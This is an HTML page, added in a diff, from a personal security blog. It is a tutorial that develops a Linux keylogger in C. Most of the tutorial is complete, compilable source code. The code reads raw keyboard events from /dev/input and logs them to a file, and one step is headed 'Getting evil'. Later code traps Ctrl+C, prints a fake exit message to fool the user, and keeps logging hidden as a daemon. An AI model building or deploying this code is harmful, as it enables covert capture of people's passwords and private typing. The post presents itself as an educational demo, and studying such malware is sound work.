@@ -1,0 +1,863 @@
+<!DOCTYPE html>
+<html lang="en-us">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <meta http-equiv="X-UA-Compatible" content="ie=edge" />
+    <title>Keylogger for Linux | ‡Connected‡</title>
+
+    
+<link href="/images/extras/favicon.ico" rel="shortcut icon" type="image/x-icon" />
+
+
+
+
+<meta name="author" content="ayedaemon" />
+<meta name="description" content="  Developing a low level keylogger for linux using C.
+ " />
+
+
+
+<meta name="generator" content="Hugo 0.81.0" />
+
+<link rel="canonical" href="https://ayedaemon.github.io/posts/keylogger-for-linux/" />
+
+
+<meta property="og:title" content="Keylogger for Linux" />
+<meta property="og:description" content="
+
+Developing a low level keylogger for linux using C.
+
+" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://ayedaemon.github.io/posts/keylogger-for-linux/" /><meta property="article:section" content="posts" />
+<meta property="article:published_time" content="2021-02-02T14:47:26&#43;05:30" />
+<meta property="article:modified_time" content="2021-04-14T09:59:01&#43;05:30" />
+
+
+
+
+<meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="Keylogger for Linux"/>
+<meta name="twitter:description" content="
+
+Developing a low level keylogger for linux using C.
+
+"/>
+
+
+<link rel="stylesheet" href="/css/semantic.min.css" />
+<link rel="stylesheet" href="/css/icomoon.css" />
+<link rel="stylesheet" href="/css/OverlayScrollbars.min.css" />
+<link rel="stylesheet" href="/css/github-markdown.css" />
+<link rel="stylesheet" href="/css/site.css" />
+
+<style>
+  a:not(.ui.button):hover {
+    text-decoration: underline;
+  }
+
+  
+  a:not(.ui.button) {
+    color: seagreen !important;
+  }
+  
+
+  
+  .inverted a:not(.ui.button),
+  .inverted a:not(.ui.button):hover {
+     color: darkseagreen !important;
+  }
+  
+
+  
+  body.default {
+    
+    background-color: white;
+    
+
+    
+    background-image: url(/img/light-background.jpg);
+    
+  }
+  
+
+  
+  body.dark {
+    
+    background-color: black;
+    
+
+    
+    background-image: url(/img/dark-background.jpg);
+    
+  }
+  
+</style>
+
+
+    
+
+
+
+<link rel="stylesheet" data-highlight href="https://cdn.jsdelivr.net/gh/highlightjs/cdn-release/build/styles/gruvbox-light.min.css" />
+
+
+
+
+
+
+
+    
+  </head>
+
+  <body class="default">
+    
+<nav class="ui secondary menu dream-menu">
+
+  <div class="item">
+    <i class="large link bullseye icon dream-flip-toggle" title="Flip it!"></i>
+  </div>
+  <div class="item">
+    <i class="large link home icon" title="Home" onclick="window.location.href = 'https:\/\/ayedaemon.github.io\/'"></i>
+  </div>
+  
+  <div class="item">
+    <i class="large link icon theme-switch" onclick="themeSwitch()"></i>
+  </div>
+  
+  
+  <div class="item">
+    <i class="large link search icon" onclick="toggleSearch()"></i>
+  </div>
+  
+</nav>
+
+    <div class="flip-container">
+      <div class="flipper">
+        <section class="front">
+          <div class="dream-max-width">
+            
+<div class="ui relaxed grid dream-grid">
+  <aside class="sixteen wide mobile sixteen wide tablet four wide computer column dream-single-aside">
+    
+    
+    <div class="ui segment toc">
+      <nav id="TableOfContents">
+  <ul>
+    <li>
+      <ul>
+        <li><a href="#what-is-a-keylogger-how-to-make-one">What is a Keylogger?? How to make one?</a></li>
+        <li><a href="#making-our-keylogger-more-dynamic">Making our keylogger more dynamic.</a></li>
+        <li><a href="#what-next-getting-evil">What next? &hellip;Getting evil!!</a></li>
+        <li><a href="#going-undercover">Going undercover</a></li>
+        <li><a href="#conclusion">Conclusion.</a></li>
+      </ul>
+    </li>
+  </ul>
+</nav>
+    </div>
+    
+    <div class="ui segment actions">
+      <button
+        class="ui circular icon button save-as-image"
+        title="Save as image"
+        onclick="savePostAsImg()">
+        <i class="save icon"></i>
+      </button>
+
+      <a href="https://twitter.com/intent/tweet?text=Keylogger%20for%20Linux&url=https%3a%2f%2fayedaemon.github.io%2fposts%2fkeylogger-for-linux%2f" class="ui circular twitter icon button">
+  <i class="twitter icon"></i>
+</a>
+<a href="https://facebook.com/sharer/sharer.php?u=https%3a%2f%2fayedaemon.github.io%2fposts%2fkeylogger-for-linux%2f" class="ui circular facebook icon button">
+  <i class="facebook icon"></i>
+</a>
+
+
+    </div>
+  </aside>
+  <div class="sixteen wide mobile sixteen wide tablet twelve wide computer column markdown-body dream-single" id="dream-save-post-as-img">
+    
+    <div class="ui top attached segment cover">
+      <div class="cover-img" style="background-image: url(https://cdn-images-1.medium.com/max/640/1*X9cxcchj9h9vGjHKAtG_mg.png);"></div>
+    </div>
+    
+    <section class="ui attached segment">
+      <header>
+        <h1 class="ui large header">Keylogger for Linux<div class="sub header">
+            @
+            
+              
+                ayedaemon
+              
+            
+
+            | 
+                Tuesday, Feb 2, 2021
+              
+
+            | 9 minutes read
+
+            | Update at
+              
+                Wednesday, Apr 14, 2021
+              
+          </div>
+        </h1>
+      </header>
+
+      <article class="main"><blockquote>
+<blockquote>
+<p>Developing a low level keylogger for linux using C.</p>
+</blockquote>
+</blockquote>
+<p>I am putting this blog in a bottom-up approach. We&rsquo;ll start with the basic program that can act as a keylogger.</p>
+<h3 id="what-is-a-keylogger-how-to-make-one">What is a Keylogger?? How to make one?</h3>
+<blockquote>
+<p>Keylogger is a program (or a hardware sometimes) that logs all the keystrokes made by the keyboard.</p>
+</blockquote>
+<p>We know that there is something in OS that listens to the keyboard events and perform actions accordingly. For example, when we press <em>alt+tab</em> it changes the current focus to another application/screen.</p>
+<p>According to wikipedia, in linux, the <a href="https://en.wikipedia.org/wiki/Evdev">event devices</a> generalizes all the raw input from device drivers and makes them available through character devices in <code>/dev/input/</code> directory.</p>
+<p><em>(If you don&rsquo;t know about <code>character devices</code>, think it as a real-time stream data)</em></p>
+<p>All the event files/devices are located in <code>/dev/input/</code> directory. It was very easy to figure out the file after looking at the directory structure.</p>
+<p><img src="https://cdn-images-1.medium.com/max/640/1*X9cxcchj9h9vGjHKAtG_mg.png" alt="directory-structure"></p>
+<p>It is pretty obvious that my keyboard event file is <code>/dev/input/by-path/platform-i8042-serio-0-event-kbd</code>. (For you, this may change, but it&rsquo;ll have <strong>kbd</strong> in it&rsquo;s name!!)</p>
+<p>So I wrote a program that will continuously read data from this file and print it on screen.</p>
+<p>CODE - <code>basic_keylogger.c</code></p>
+<pre><code>#include &lt;errno.h&gt;
+#include &lt;fcntl.h&gt;
+#include &lt;linux/input.h&gt;
+#include &lt;stdio.h&gt;
+#include &lt;stdlib.h&gt;
+#include &lt;unistd.h&gt;
+
+int main(void) {
+  errno = 0;
+  struct input_event ev;
+  //This is the keyboard event file
+  char* kbd_path = &quot;/dev/input/by-path/platform-i8042-serio-0-event-kbd&quot;;
+  int fd = open(kbd_path, O_RDONLY);
+  if(fd == -1)
+  {
+    printf(&quot;Error %d\n&quot;, errno);
+    exit(EXIT_FAILURE);
+  }
+
+  while (1)
+  {
+    read(fd, &amp;ev, sizeof(struct input_event)); //read from keyboard
+    printf(&quot;%i - %i\n&quot;,ev.code, ev.value);
+  }
+
+  return 0;
+}
+</code></pre><p>Compile this and run it.</p>
+<pre><code>## Compile
+
+gcc basic_keylogger.c -o basic_keylogger.out
+
+## Execute it
+
+./basic_keylogger.out
+</code></pre><p>This will give output something like this.</p>
+<p><img src="https://cdn-images-1.medium.com/max/640/1*Y-Z4wh_4BDSNLf6v1_NF8Q.png" alt="output1"></p>
+<p>I am not sure about what this all is. But I saw some pattern and decided to learn more on this later. The pattern here is, whenever <code>ev.value</code> is <code>1</code> then I am getting a <code>ev.code</code> unique for each key. So I decided to just filter out the data with <code>ev.value == 1</code>.</p>
+<p>CODE - <code>basic_keylogger.c</code> (minor modification)</p>
+<pre><code>#include &lt;errno.h&gt;
+#include &lt;fcntl.h&gt;
+#include &lt;linux/input.h&gt;
+#include &lt;stdio.h&gt;
+#include &lt;stdlib.h&gt;
+#include &lt;unistd.h&gt;
+
+int main(void) {
+  errno = 0;
+  struct input_event ev;
+  //This is the keyboard event file
+  char* kbd_path = &quot;/dev/input/by-path/platform-i8042-serio-0-event-kbd&quot;;
+  int fd = open(kbd_path, O_RDONLY);
+  if(fd == -1)
+  {
+    printf(&quot;Error %d\n&quot;, errno);
+    exit(EXIT_FAILURE);
+  }
+
+  while (1)
+  {
+    read(fd, &amp;ev, sizeof(struct input_event)); //read from keyboard
+    if(ev.value == 1)
+    {
+      printf(&quot;%i - %i\n&quot;,ev.code, ev.value);
+    }
+  }
+
+  return 0;
+}
+</code></pre><p>After again compiling and running this, I was just getting the useful data from everything.</p>
+<p><img src="https://cdn-images-1.medium.com/max/640/1*zRFTkTAQGKSMSspmAxqCjg.png" alt="useful-raw-data"></p>
+<p>This is the simple idea of making the keylogger. But there are a lot of things we haven&rsquo;t done.</p>
+<h3 id="making-our-keylogger-more-dynamic">Making our keylogger more dynamic.</h3>
+<p>Till now, we are using hard coded file name for the keyboard. We can make it more dynamic by searching for the <strong>kbd</strong> file in <code>/dev/input/by-path/</code> and then read that file for the events. And then save the events in a file.</p>
+<p>For this purpose, I have changed the working directory structure to make the project more modular.</p>
+<p><img src="https://cdn-images-1.medium.com/max/640/1*2VyFdbneXRLZPXuScZGCPg.png" alt=""></p>
+<p>CODE:- <code>basic_keylogger.c</code></p>
+<pre><code>#include &quot;basic_keylogger.h&quot;
+
+
+int main(void) {
+  errno = 0;
+  struct input_event ev;
+  char* kbd = get_me_a_keyboard(); // Get keyboard name
+  char* kbd_path = concat(INPUT_EVENT_DIR, kbd); // Get complete path for keyboard
+
+  int fd = open(kbd_path, O_RDONLY);
+  if(fd == -1)
+  {
+    printf(&quot;Error %d\n&quot;, errno);
+    exit(EXIT_FAILURE);
+  }
+  printf(&quot;Reading from %s\n&quot;,kbd_path);
+  free(kbd_path); // free some memory
+  while (1)
+  {
+    read(fd, &amp;ev, sizeof(struct input_event)); //read from keyboard
+    if(ev.type == 1)
+      log_in_file(ev); //log the event
+  }
+  return 0;
+}
+
+</code></pre><p>This main program <em>includes</em> <code>basic_keylogger.h</code> file - which I have used to include all the libraries and <em>define</em> macros.</p>
+<p>CODE:- <code>basic_keylogger.h</code></p>
+<pre><code>
+/*
+//
+// defining variables
+//
+*/
+
+#define INPUT_EVENT_DIR &quot;/dev/input/by-path/&quot;
+#define LOG_FILE &quot;/tmp/keylog.txt&quot;
+
+/*
+//
+// importing system headers
+//
+*/
+
+#include &lt;dirent.h&gt;
+#include &lt;errno.h&gt;
+#include &lt;fcntl.h&gt;
+#include &lt;linux/input.h&gt;
+#include &lt;stdio.h&gt;
+#include &lt;stdlib.h&gt;
+#include &lt;string.h&gt;
+#include &lt;sys/stat.h&gt;
+#include &lt;sys/types.h&gt;
+#include &lt;time.h&gt;
+#include &lt;unistd.h&gt;
+
+/*
+//
+// importing utility functions
+//
+*/
+
+#include &quot;utils/logger.c&quot;
+#include &quot;utils/helpers.c&quot;
+#include &quot;utils/keyboard.c&quot;
+</code></pre><p>Here are 3 more files included for obvious purposes.</p>
+<p>CODE:- <code>utils/logger.c</code> (logger function)</p>
+<pre><code>void log_in_file(struct input_event ev)
+{
+  printf(&quot;Logging&quot;);
+    time_t t = time(NULL);
+    struct tm tm = *localtime(&amp;t);
+    FILE* fptr = fopen(LOG_FILE, &quot;a&quot;);
+    // print( [date time] keycode keyvalue ) - keyvalue =&gt; {press; lift; long press}
+    fprintf(fptr, &quot;[ %d-%02d-%02d %02d:%02d:%02d ]   key %i state %i\n&quot;, tm.tm_year + 1900, tm.tm_mon + 1, tm.tm_mday, tm.tm_hour, tm.tm_min, tm.tm_sec, ev.code, ev.value);
+    if(tm.tm_sec == 0)
+    {
+      /* Do whatever you want to do here
+        It is like a scheduler section.*/
+
+      //fprintf(fptr, &quot;%s\n&quot;, &quot;1 minute check\n&quot;);
+    }
+    fclose(fptr);
+    printf(&quot;  logged\n&quot;);
+}
+</code></pre><p>CODE:- <code>utils/helpers.c</code> (now only used for concatination of 2 strings)</p>
+<pre><code>char* concat(const char *s1, const char *s2)
+{
+    const size_t len1 = strlen(s1);
+    const size_t len2 = strlen(s2);
+    char *result = malloc(len1 + len2 + 1); // +1 for the null-terminator
+    // in real code you would check for errors in malloc here
+    memcpy(result, s1, len1);
+    memcpy(result + len1, s2, len2 + 1); // +1 to copy the null-terminator
+    return result;
+}
+</code></pre><p>CODE:- <code>utils/keyboard.c</code> (get keyboard device from the directory)</p>
+<pre><code>char* get_me_a_keyboard()
+{
+  struct dirent **namelist;
+  int n=0,i=0;
+  n = scandir(INPUT_EVENT_DIR, &amp;namelist, NULL, alphasort); // read the directory for the files
+  if(n==-1)
+  {
+    // perror(&quot;Scandir Failed!!\n&quot;);
+    exit(EXIT_FAILURE);
+  }
+  if(n&lt;=2){
+    // perror(&quot;No devices found!!\n&quot;);
+    exit(EXIT_FAILURE);
+  }
+  // printf(&quot;[ * ] %d Devices found !!\n&quot;,n-2);
+  for(i=0; i&lt;n; i++)
+    if( namelist[i]-&gt;d_name == &quot;.&quot; || namelist[i]-&gt;d_name == &quot;..&quot;) // skip for . and ..
+      continue;
+    else if(strstr(namelist[i]-&gt;d_name,&quot;kbd&quot;)) // check if the filename has &quot;kbd&quot; (keyboard) in it
+      break;  // if yes, do not look further
+
+  return namelist[i]-&gt;d_name; // and return keyboard file name to caller function
+}
+</code></pre><p>After compiling and executing the binary. We get <strong>logging - logged</strong> message on the terminal and the actual log is being stored in <code>/tmp/keylog.txt</code> file - as mentioned in <code>basic_keylogger.h</code> file.</p>
+<p><img src="https://cdn-images-1.medium.com/max/640/1*ikK7hBwfMweto2rYqhaBFg.png" alt=""></p>
+<p><img src="https://cdn-images-1.medium.com/max/640/1*8wYAQGNMNS7TymthEnSb6g.png" alt=""></p>
+<hr>
+<h3 id="what-next-getting-evil">What next? &hellip;Getting evil!!</h3>
+<p>We can close the program by pressing <em>ctrl+c</em> or send it to background by <em>ctrl+z</em>. These key combinations send a signal to the process to close.
+And we can handle these signals in our code&hellip;. using <code>signal.h</code> header file. (import this in the code.)</p>
+<p>CODE - <code>basic_keylogger.c</code> (added signal handlers)</p>
+<pre><code>#include &quot;basic_keylogger.h&quot;
+
+// Signal handler function
+void signal_handler(int sig) {
+  printf(&quot;Sorry, But I won't exit.\n&quot;);
+}
+
+int main(void) {
+  errno = 0;
+
+  struct sigaction signal; // create signal action struct
+  signal.sa_handler = signal_handler; // initialize the handler function
+  sigaction(SIGINT, &amp;signal, NULL); // assign the signal action to a specific signal
+
+  struct input_event ev;
+  char* kbd = get_me_a_keyboard(); // Get keyboard name
+  char* kbd_path = concat(INPUT_EVENT_DIR, kbd); // Get complete path for keyboard
+
+  int fd = open(kbd_path, O_RDONLY);
+  if(fd == -1)
+  {
+    printf(&quot;Error %d\n&quot;, errno);
+    exit(EXIT_FAILURE);
+  }
+  printf(&quot;Reading from %s\n&quot;,kbd_path);
+  free(kbd_path); // free some memory
+  while (1)
+  {
+    read(fd, &amp;ev, sizeof(struct input_event)); //read from keyboard
+    if(ev.type == 1)
+      log_in_file(ev); //log the event
+  }
+  return 0;
+}
+</code></pre><p>As expected with this code, I am unable to close the program with <em>ctrl+c</em>. Whenever I am pressing it, it gives me a message that <strong>&ldquo;Sorry, But I won&rsquo;t exit.&quot;</strong></p>
+<p><img src="https://cdn-images-1.medium.com/max/640/1*882rJMJZjAMEce-EupTVhg.png" alt=""></p>
+<p>This program can only be terminated with <strong>kill</strong> signal. See <a href="https://www.linux.com/training-tutorials/how-kill-process-command-line/">here</a> to know how.</p>
+<p><img src="https://cdn-images-1.medium.com/max/640/1*atvzfHlH5gEBaNw3PcoDgA.png" alt=""></p>
+<h3 id="going-undercover">Going undercover</h3>
+<p>What if we trick user with a false closing message and go undercover <a href="https://notes.shichao.io/apue/ch13/">(Daemon process)</a>.</p>
+<p>The idea is to create the process as a daemon process whenever the user press <em>ctrl+c</em>. Also give the user a good message so that he actually believes that the process has closed and then probably he&rsquo;ll not check for the running processes to find if it actually has closed.</p>
+<p>To achieve this, I&rsquo;ll make slight changes to my <code>signal_handler</code> function and add a <code>daemonize</code> function to create a daemon process. If you have already not seen what a daemon process is and how to create one - Look <a href="https://notes.shichao.io/apue/ch13/">here</a>.</p>
+<p>CODE:- <code>basic_keylogger.c</code> (changed the signal_handler function)</p>
+<pre><code>#include &quot;basic_keylogger.h&quot;
+
+
+// Signal handler function
+void signal_handler(int sig) {
+  printf(&quot;Exiting very gracefully :)&quot;); //fake message
+  daemonize(); // Go undercover
+}
+
+int main(void) {
+  errno = 0;
+
+  struct sigaction signal; // create signal action struct
+  signal.sa_handler = signal_handler; // initialize the handler function
+  sigaction(SIGINT, &amp;signal, NULL); // assign the signal action to a specific signal
+
+  struct input_event ev;
+  char* kbd = get_me_a_keyboard(); // Get keyboard name
+  char* kbd_path = concat(INPUT_EVENT_DIR, kbd); // Get complete path for keyboard
+
+  int fd = open(kbd_path, O_RDONLY);
+  if(fd == -1)
+  {
+    printf(&quot;Error %d\n&quot;, errno);
+    exit(EXIT_FAILURE);
+  }
+  printf(&quot;Reading from %s\n&quot;,kbd_path);
+  free(kbd_path); // free some memory
+  while (1)
+  {
+    read(fd, &amp;ev, sizeof(struct input_event)); //read from keyboard
+    if(ev.type == 1)
+      log_in_file(ev); //log the event
+  }
+  return 0;
+}
+</code></pre><p>Here, I am using <code>daemonize</code> funtion which is defined in <code>./utils/daemonize.c</code> and imported in <code>basic_keylogger.h</code>.</p>
+<p>CODE:- <code>daemonize.c</code></p>
+<pre><code>int daemonize()
+{
+    pid_t pid, sid;
+
+    /* Fork off the parent process */
+    pid = fork();
+    if (pid &lt; 0) {
+        exit(EXIT_FAILURE);
+    }
+    /* If we got a good PID, then
+        we can exit the parent process. */
+    if (pid &gt; 0) { // Child can continue to run even after the parent has finished executing
+        exit(EXIT_SUCCESS);
+    }
+
+    /* Change the file mode mask */
+    umask(0);
+
+    /* Open any logs here */
+
+    /* Create a new SID for the child process */
+    sid = setsid();
+    if (sid &lt; 0) {
+        /* Log the failure */
+        exit(EXIT_FAILURE);
+    }
+
+    /* Change the current working directory */
+    if ((chdir(&quot;/&quot;)) &lt; 0) {
+        /* Log the failure */
+        exit(EXIT_FAILURE);
+    }
+
+    /* Close out the standard file descriptors */
+    //Because daemons generally dont interact directly with user so there is no need of keeping these open
+    close(STDIN_FILENO);
+    close(STDOUT_FILENO);
+    close(STDERR_FILENO);
+
+    return(pid);
+}
+</code></pre><p>After compiling and executing this code. We get a decent exit message like this.</p>
+<p><img src="https://cdn-images-1.medium.com/max/640/1*y_eJXDhm9j1vkrAzajJUEA.png" alt=""></p>
+<p>But we can check from the <strong>/tmp/keylog.txt</strong> file that the program is still adding key events to the file. Use <code>tail -f /tmp/keylog.txt</code> command to check appending logs.</p>
+<p>You can look for the process using <code>ps -A | grep 'your_binary_name'</code> command to get the process ID of the daemon keylogger running behind the scene. And then kill it by using <code>kill -9 &lt;processID&gt;</code>.</p>
+<hr>
+<h3 id="conclusion">Conclusion.</h3>
+<p>You can take this blog as an educational purpose demo that even the least suspecting program from any untrusted source can be malicious and can do a lot of things you have not expected it to do.
+We can create simple programs, that can read the whole file system to know what programs you use.. get the files with sensitive information.. passwords stored in the browsers.. setup a trojan.. and what not.
+Also with small modifications, I can send all the logs created locally to a remote server.</p>
+<p>This program is only tested in a bare-metal linux system. This can&rsquo;t work on windows (because they have different system calls and API to work) and this is also not working in VM for some reason which I am trying to figure out why. If you have any knowledge regarding this, please feel free to reach out and help me to understand the problem.</p>
+<p>All this code is present in github repo here -&gt; (<a href="https://github.com/ayedaemon/C-practice/tree/master/lin-c/keylogger">https://github.com/ayedaemon/C-practice/tree/master/lin-c/keylogger</a>)</p></article>
+    </section>
+
+    
+
+    
+
+    
+  </div>
+</div>
+
+
+            <footer class="ui basic center aligned segment" style="background-color: transparent;">
+              
+              <p>© 2020 - 2021 ‡Connected‡</p>
+              
+
+              
+
+              
+            </footer>
+          </div>
+        </section>
+        <section class="back">
+          <div class="dream-max-width">
+            <center>
+<header class="ui basic very padded segment dream-header">
+  <div class="ui small circular image">
+    
+    <img src="https://cdn-images-1.medium.com/max/640/1*_0awH307tnbccPVc6jlx6Q.jpeg" />
+    
+  </div>
+
+  <div class="content">
+
+    <h1 class="ui medium header">ayedaemon&#39;s blog<div class="sub header">Connecting the dots</div>
+
+    </h1>
+
+    <article class="ui horizontal list">
+      
+      <a class="item" href="/posts">
+        <i class="archive icon" title="Archives"></i>
+      </a>
+      
+      <a class="item" href="/categories">
+        <i class="th list icon" title="All Categories"></i>
+      </a>
+      <a class="item" href="/tags">
+        <i class="tags icon" title="All Tags"></i>
+      </a>
+    </article>
+
+    
+    <article class="dream-tags">
+    
+      
+      
+      <a class="ui label" href="/tags/c-programming/" title="C Programming">C Programming</a>
+    
+      
+      
+      <a class="ui label" href="/tags/cryptograpy/" title="Cryptograpy">Cryptograpy</a>
+    
+      
+      
+      <a class="ui label" href="/tags/debugging/" title="Debugging">Debugging</a>
+    
+      
+      
+      <a class="ui label" href="/tags/git/" title="Git">Git</a>
+    
+      
+      
+      <a class="ui label" href="/tags/ids/" title="IDS">IDS</a>
+    
+      
+      
+      <a class="ui label" href="/tags/keylogger/" title="Keylogger">Keylogger</a>
+    
+      
+      
+      <a class="ui label" href="/tags/linux/" title="Linux">Linux</a>
+    
+      
+      
+      <a class="ui label" href="/tags/security/" title="Security">Security</a>
+    
+    </article>
+    
+  </div>
+</header>
+</center>
+
+
+<div class="ui relaxed grid dream-grid dream-back">
+  
+  
+  
+  <div class="sixteen wide mobile eight wide tablet four wide computer column dream-column">
+    <article class="ui segment markdown-body">
+      <h3 class="ui header">Certificates</h3>
+      <p>✔️<a href="https://rhtapps.redhat.com/verify?certId=190-153-684">Red Hat Certified System Administrator (RHEL 8)</a></p>
+<p>✔️<a href="https://rhtapps.redhat.com/verify?certId=190-153-684">Red Hat Certified Specialist in Ansible Automation</a></p>
+<p>✔️<a href="https://rhtapps.redhat.com/verify?certId=190-153-684">Red Hat Certified Specialist in Ceph Storage Administration</a></p>
+<p>✔️<a href="https://www.credential.net/8cb287f5-5a70-4400-9d45-c9a2a38c2160#gs.cz20tt">Certified Network Security Specialist (CNSS | ICSI, UK)</a></p>
+<p>✔️<a href="https://training.fortinet.com/mod/customcert/verify_certificate.php?code=i3PDBanCTh">Fortinet Certified NSE1</a></p>
+<p>✔️<a href="https://training.fortinet.com/mod/customcert/verify_certificate.php?code=IxKFPCjC6a">Fortinet Certified NSE2</a></p>
+
+    </article>
+  </div>
+  
+  <div class="sixteen wide mobile eight wide tablet four wide computer column dream-column">
+    <article class="ui segment markdown-body">
+      <h3 class="ui header">Who am I ???</h3>
+      <p>Hi, my name is Rishabh Umrao.</p>
+<p>I am an Information Security Engineer from India who is interested in Devops, Security and Automation. Learning about security flaws, exploiting and mitigating them is one of my hobbies.</p>
+<p>I am usually playing around with multiple technology stacks to keep track of new concepts and get better understanding of the old.</p>
+
+    </article>
+  </div>
+  
+
+  <div class="sixteen wide mobile eight wide tablet four wide computer column dream-column">
+    <article class="ui segment">
+      <h3 class="ui header">Social Links</h3>
+      <nav class="ui secondary menu dream-menu dream-socials">
+  
+    <div class="item">
+      <a href="/index.xml">
+        <i class="large rss square icon" title="RSS"></i>
+      </a>
+    </div>
+  
+  
+    <div class="item">
+      <a href="mailto:ris3234@gmail.com">
+        <i class="large mail icon" title="Email"></i>
+      </a>
+    </div>
+  
+
+  
+    <div class="item">
+      <a href="https://twitter.com/aye_daemon" target="_blank">
+        <i class="large twitter icon" title="Twitter"></i>
+      </a>
+    </div>
+  
+
+  
+    <div class="item">
+      <a href="https://www.linkedin.com/in/ayedaemon" target="_blank">
+        <i class="large linkedin icon" title="Linkedin"></i>
+      </a>
+    </div>
+  
+
+  
+    <div class="item">
+      <a href="https://github.com/ayedaemon" target="_blank">
+        <i class="large github icon" title="GitHub"></i>
+      </a>
+    </div>
+  
+
+  
+
+  
+    <div class="item">
+      <a href="https://www.medium.com/@ayedaemon" target="_blank">
+        <i class="large medium icon" title="medium"></i>
+      </a>
+    </div>
+  
+
+  
+    <div class="item">
+      <a href="https://www.reddit.com/user/ayeDaemon" target="_blank">
+        <i class="large reddit icon" title="reddit"></i>
+      </a>
+    </div>
+  
+
+</nav>
+
+    </article>
+  </div>
+
+  <div class="sixteen wide mobile eight wide tablet four wide computer column dream-column">
+    
+  </div>
+
+  
+  
+</div>
+
+          </div>
+        </section>
+      </div>
+    </div>
+
+    <script>
+  window.defaultDark =  null 
+  window.backgroundDark = "black"
+  window.backgroundImageDark = "/img/dark-background.jpg"
+  window.darkNav =  true 
+  window.hasTwitterEmbed =  true 
+
+  if (window.hasTwitterEmbed) {
+    
+    window.twttr = (function (d, s, id) {
+      var js,
+        fjs = d.getElementsByTagName(s)[0],
+        t = window.twttr || {}
+      if (d.getElementById(id)) return t
+      js = d.createElement(s)
+      js.id = id
+      js.src = 'https://platform.twitter.com/widgets.js'
+      fjs.parentNode.insertBefore(js, fjs)
+
+      t._e = []
+      t.ready = function (f) {
+        t._e.push(f)
+      }
+
+      return t
+    })(document, 'script', 'twitter-wjs')
+  }
+</script>
+<script src="/js/jquery.min.js"></script>
+<script src="/js/semantic.min.js"></script>
+<script src="/js/jquery.overlayScrollbars.min.js"></script>
+<script src="/js/header.js"></script>
+<script src="/js/main.js"></script>
+<script src="/js/theme.js"></script>
+
+    
+<script src="/js/html2canvas.min.js"></script>
+<script src="/js/post.js"></script>
+
+
+<script src="https://cdn.jsdelivr.net/gh/highlightjs/cdn-release/build/highlight.min.js"></script>
+
+
+
+<script src="https://cdn.jsdelivr.net/gh/highlightjs/cdn-release/build/languages/ocaml.min.js"></script>
+
+
+
+<script>
+  hljs.initHighlightingOnLoad()
+  setHighlightTheme()
+
+  function setHighlightTheme() {
+    var isDark = localStore.getItem('hugo-theme-dream-is-dark')
+    isDark = isDark ? isDark : window.defaultDark ? 'y' : isDark
+
+    var lightTheme = "gruvbox-light"
+    var darkTheme = "gruvbox-dark"
+    var theme = isDark === 'y' ? darkTheme : lightTheme
+
+    $('link[data-highlight]').attr('href', 'https://cdn.jsdelivr.net/gh/highlightjs/cdn-release/build/styles/' + theme + '.min.css')
+    $('pre').css('background', isDark === 'y' ? '#333' : '')
+  }
+</script>
+
+
+
+
+
+    
+    <div class="ui inverted segment" id="dream-search">
+  <div class="ui search">
+    <div class="ui transparent input">
+      <input class="prompt" type="text" placeholder="Search" />
+    </div>
+    <div class="results"></div>
+  </div>
+</div>
+<script>
+  $(document).ready(function () {
+    $.getJSON('https:\/\/ayedaemon.github.io\//index.json', function (data) {
+      $('.ui.search').search({
+        source: data,
+        searchFields: ['title'],
+        showNoResults: true,
+      })
+    })
+  })
+</script>
+<script src="/js/search.js"></script>
+
+    
+
+    
+
+    
+  </body>
+</html>
